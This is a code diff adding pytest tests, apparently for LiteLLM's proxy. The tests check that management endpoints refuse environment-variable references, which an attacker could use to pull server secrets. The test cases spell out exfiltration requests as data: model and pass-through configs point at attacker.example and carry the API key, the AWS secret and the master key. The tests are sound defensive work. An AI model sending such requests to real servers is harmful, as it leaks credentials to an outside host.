@@ -237,3 +237,97 @@ def test_master_key_allowed_ips_applies_before_management_only(monkeypatch):
     with pytest.raises(HTTPException) as denied:
         RouteChecks.should_call_route(route="/key/list", valid_token=_master_key_token(), request=bad)
     assert "source address" in denied.value.detail
+
+
+@pytest.mark.parametrize(
+    "method, route, body",
+    [
+        # The reported exfiltration shape: a model whose key is a server env var.
+        (
+            "POST",
+            "/model/new",
+            {
+                "model_name": "m",
+                "litellm_params": {
+                    "model": "openai/x",
+                    "api_key": "os.environ/OPENAI_API_KEY",
+                    "api_base": "https://attacker.example",
+                },
+            },
+        ),
+        ("POST", "/model/update", {"litellm_params": {"api_key": "os.environ/ANTHROPIC_API_KEY"}}),
+        ("PATCH", "/model/abc/update", {"litellm_params": {"aws_secret_access_key": "os.environ/AWS_SECRET_ACCESS_KEY"}}),
+        ("POST", "/credentials", {"credential_name": "c", "credential_values": {"api_key": "os.environ/DB_PASSWORD"}}),
+        (
+            "POST",
+            "/config/pass_through_endpoint",
+            {"path": "/x", "target": "https://attacker.example", "headers": {"Authorization": "os.environ/LITELLM_MASTER_KEY"}},
+        ),
+        ("POST", "/config/update", {"environment_variables": {"X": "os.environ/LITELLM_MASTER_KEY"}}),
+        # Nested inside lists, and used as a key.
+        ("POST", "/guardrails", {"guardrail": {"litellm_params": {"headers": [{"k": "os.environ/GEMINI_API_KEY"}]}}}),
+        ("PUT", "/search_tools/abc", {"litellm_params": {"os.environ/QWEN_API_KEY": "x"}}),
+    ],
+)
+def test_management_write_with_env_reference_is_rejected(method, route, body):
+    with pytest.raises(HTTPException) as denied:
+        RouteChecks.reject_env_references_in_management_writes(
+            route=route, request=_request(method, route, None), request_data=body
+        )
+    assert denied.value.status_code == 400
+    assert "Environment variable references" in denied.value.detail
+
+
+@pytest.mark.parametrize(
+    "method, route, body",
+    [
+        # Ordinary management writes pass.
+        (
+            "POST",
+            "/model/new",
+            {"model_name": "m", "litellm_params": {"model": "openai/x", "api_key": "sk-literal", "api_base": "https://api.example"}},
+        ),
+        ("POST", "/key/generate", {"key_alias": "000001", "metadata": {"note": "mentions os.environ/ in the middle"}}),
+        # Reads are not inspected.
+        ("GET", "/model/info", {"x": "os.environ/OPENAI_API_KEY"}),
+        # Model calls are not inspected: prompt text is user content.
+        ("POST", "/v1/chat/completions", {"model": "m", "messages": [{"role": "user", "content": "os.environ/HOME"}]}),
+        ("POST", "/v1/messages", {"model": "m", "messages": [{"role": "user", "content": "os.environ/HOME"}]}),
+        ("POST", "/v1/responses", {"model": "m", "input": "os.environ/HOME"}),
+        # Nothing to inspect.
+        ("POST", "/model/new", {}),
+        ("POST", "/model/new", None),
+    ],
+)
+def test_management_write_env_check_allows(method, route, body):
+    RouteChecks.reject_env_references_in_management_writes(
+        route=route, request=_request(method, route, None), request_data=body
+    )
+
+
+@pytest.mark.asyncio
+async def test_user_api_key_auth_rejects_env_reference_on_model_new(monkeypatch):
+    """End to end through user_api_key_auth: even the master key cannot store an
+    env reference."""
+    _patch_proxy_server(monkeypatch)
+    monkeypatch.delenv("LITELLM_MASTER_KEY_ALLOWED_IPS", raising=False)
+    monkeypatch.delenv("LITELLM_MASTER_KEY_MANAGEMENT_ONLY", raising=False)
+    request = _request(
+        "POST",
+        "/model/new",
+        "/model/new",
+        headers=[(b"content-type", b"application/json")],
+        body=(
+            b'{"model_name":"m","litellm_params":{"model":"openai/x",'
+            b'"api_key":"os.environ/OPENAI_API_KEY","api_base":"https://attacker.example"}}'
+        ),
+    )
+    with patch(
+        "litellm.proxy.auth.user_api_key_auth.run_centralized_common_checks",
+        new_callable=AsyncMock,
+    ) as common_checks:
+        with pytest.raises(HTTPException) as denied:
+            await _authenticate(request)
+        common_checks.assert_not_awaited()
+    assert denied.value.status_code == 400
+    assert "Environment variable references" in str(denied.value.detail)
